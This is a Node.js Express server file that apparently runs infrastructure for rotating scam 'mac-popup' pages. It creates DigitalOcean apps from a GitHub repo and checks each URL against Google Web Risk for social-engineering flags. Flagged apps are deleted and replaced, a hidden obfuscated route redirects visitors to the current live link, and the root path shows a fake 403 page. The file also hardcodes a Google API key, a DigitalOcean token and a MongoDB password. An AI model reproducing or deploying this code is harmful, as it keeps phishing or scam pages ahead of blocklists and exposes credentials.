const path = require("path");

const express = require("express");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const Popup = require("./models/popup");
const Name = require("./models/name");
const app = express();
const Axios = require("axios").default;
app.set("view engine", "ejs");

app.use(express.static(path.join(__dirname, "public")));
app.use(bodyParser.urlencoded({ extended: true }));


var counter = 0;
var val = 0;

function webRiskCall(){
  Popup.find().then(pop=>{
    var arr = pop[0].links; 
    return arr;
  }).then(res=>{
    console.log(res)
    if(res.length == 0) return;
    var url = res[counter][1];
  Axios.get(`https://webrisk.googleapis.com/v1/uris:search?key=AIzaSyAcsbEg3PxbwxTgg5ysP5iB50CeB2yjBXE&threatTypes=SOCIAL_ENGINEERING&uri=${url}`).then(res=>{
    console.log("web risk api called with url:", url);
    if(res.data.threat){
      Popup.find().then((pop)=>{
        
        var arr=pop[0].links;
        var val = arr[counter][1];

        var id;
        arr.forEach(el=>{
          if(el[1]==val) id=el[0];
        })
        console.log(id);
        deleteLinks(id);
        var new_arr = arr.filter(s=> s[1] !== val);
        
        
        pop[0].links = new_arr;

        if(counter>=arr.length-1){
          counter=0;
        }
       
        pop[0].save();
        webRiskCall();
      })
    }
  }).catch(err=>{
    console.log(err);
  })})
}

function deleteLinks(id){
  Axios.delete(`https://api.digitalocean.com/v2/apps/${id}`,{
    headers: {
      'Authorization': 'Bearer dop_v1_865ce9398638dc5c46ef7b0a69e578ab4f22a7b7e655952d58c592b2ef26736c'
    }
  }).then(res=>{
    Popup.find()
    .then((pop) => {
      var ids = pop[0]._id;
      Popup.findById(ids)
        .then((pops) => {
          var arr = [];
          arr= pops.links;
          var newArr = [];
          arr.forEach(el=>{
            if(el[0]!= id){
              newArr.push(el);
            }
          })

          pops.links = newArr;
          // console.log('this is the newArr',newArr);
          pops.save();
        }).then(val=>console.log(val));
  })
}).catch(err=>{
    console.log(err);
  })
}

function generateLinks(){
  var names;
  Name.find()
    .then((name) => {
      var id = name[0]._id;
      return name[0].name;
    }).then((name)=>{
      if(!name) return;


      Popup.find()
    .then((pop) => {
      var id = pop[0]._id;
      var arr=pop[0].links;

      if(arr.length>=10) return;

      var postData = {
        "spec": {
              "features": null,
              "region": "nyc",
              "services": [
                  {
                      "name": "mac-popup",
                      "run_command": "heroku-php-apache2",
                      "build_command": null,
                      "environment_slug": "php",
                      "instance_count": 1,
                      "instance_size_slug": null,
                      "http_port": 8080,
                      "routes": [
                          {
                              "path": "/"
                          }
                      ],
                      "git": null,
                      "github": {
                          "repo": "itachiwasted/mac-popup",
                          "branch": "main",
                          "deploy_on_push": true
                      },
                      "gitlab": null,
                      "envs": [],
                      "source_dir": "/"
                  }
              ],
              "jobs": null,
              "functions": null,
              "workers": null,
              "static_sites": null,
              "databases": null,
              "ingress": null,
              "domains": [],
              "envs": [],
              "alerts": [
                  {
                      "rule": "DEPLOYMENT_FAILED"
                  },
                  {
                      "rule": "DOMAIN_FAILED"
                  }
              ]
          }
      }

      postData.spec.name = name+val;
      val++;

      Axios.post('https://api.digitalocean.com/v2/apps',postData,{
        headers: {
          'Authorization': 'Bearer dop_v1_865ce9398638dc5c46ef7b0a69e578ab4f22a7b7e655952d58c592b2ef26736c'
        }
      }).then(res=>console.log(res)).catch(err=>console.log(err))

    })
    })
    .catch((err) => console.log(err));
}



function fetchLinks(){
  Axios.get('https://api.digitalocean.com/v2/apps',{
    headers: {
      'Authorization': 'Bearer dop_v1_865ce9398638dc5c46ef7b0a69e578ab4f22a7b7e655952d58c592b2ef26736c'
    }
  }).then(val=>{
    if(val.data){
      var newArr= [];
      val.data.apps.map(el=>{
        if(el.live_url != null){
        var arr = []
        arr.push(el.id)
        arr.push(el.live_url)
        newArr.push(arr);
        }
      })

      Popup.find()
    .then((pop) => {
      var id = pop[0]._id;
      Popup.findById(id)
        .then((pops) => {
          pops.links = newArr;
          if(counter>=newArr.length) counter=0;
          return pops.save();
        })
        .then((result) => {
          console.log(result);
        });
    })
    .catch((err) => console.log(err));
    }
  })
}
setInterval(()=>{
  webRiskCall();
},30000)
//time

setInterval(()=>{
  fetchLinks();
},60000)

setInterval(()=>{
 generateLinks()
},300000)



setInterval(()=>{
  Popup.find().then(pop=>{
    var arr = pop[0].links;
    console.log('this is the arr', arr);
    if(arr.length>=8) counter=4;
    else counter = 0;
    if(arr.length>9){
      deleteLinks(arr[9][0]);
      generateLinks();
    }
    webRiskCall();
  })
}, 150000)


app.get("/",(req,res)=>{
  res.status(403).send('<h1>Forbidden: 403</h1> <p>You don\'t have permission to access this URL.</p>');
  res.end();
});

app.get("/extension-asdas-sddfsdfsdf-sdvsdf33243feaar44grbgrg",(req,res)=>{
  var link;
  Popup.find().then(pop=>{
    var arr = pop[0].links;
    
    console.log(counter);
    console.log(arr.length);
    link = arr[counter][1];
    link.toString();
    
    return link;
  }).then(()=>{
    res.writeHead(302,{Location: link});
    res.end();
  })
});


app.get("/form", (req, res, send) => {
  Name.find()
    .then((name) => {
      var id = name[0]._id;
      var new_name = name[0].name;
      res.render("input-form",{name:new_name});
    })
    .catch((err) => console.log(err));
});

app.post("/form", (req, res) => {
  var first = req.body.first;
  Name.find()
    .then((name) => {
      var id = name[0]._id;
      var new_arr = name[0].name;
      Name.findById(id)
        .then((data) => {
          data.name = first;
          return data.save();
        })
        .then((result) => {
          console.log(result);
          val=0;
          res.redirect("/form");
        });
    })
    .catch((err) => console.log(err));
});

app.get("/links", (req, res) => {
  Popup.find()
    .then((pop) => {
      var arr = pop[0].links;

        res.render("links", { arr: arr , counter : counter});
    })
    .catch((err) => {
      console.log(err);
    });
});

app.post("/delete",(req,res)=>{
  Popup.find().then((pop)=>{
    var val = req.body.val;
    console.log(val);
    var arr=pop[0].links;
    var id;
    arr.forEach(el=>{
      if(el[1]==val) id=el[0];
    })

    console.log(id);
    deleteLinks(id);
    generateLinks();
    var new_arr = arr.filter(s=> s[1] !== val);
    
    pop[0].links = new_arr;

    if(counter>= arr.length-1){
      counter=0;
    }
    return pop[0].save();    
  }).then(result=>{
    res.redirect("/links");
  });
})
mongoose
  .connect(
    "mongodb+srv://kamal:Bhakuniji02@cluster0.zfyys.mongodb.net/macs?retryWrites=true"
  )
  .then(() => {
    app.listen(process.env.PORT || 1773);
  })
  .catch((err) => {
    console.log(err);
  });
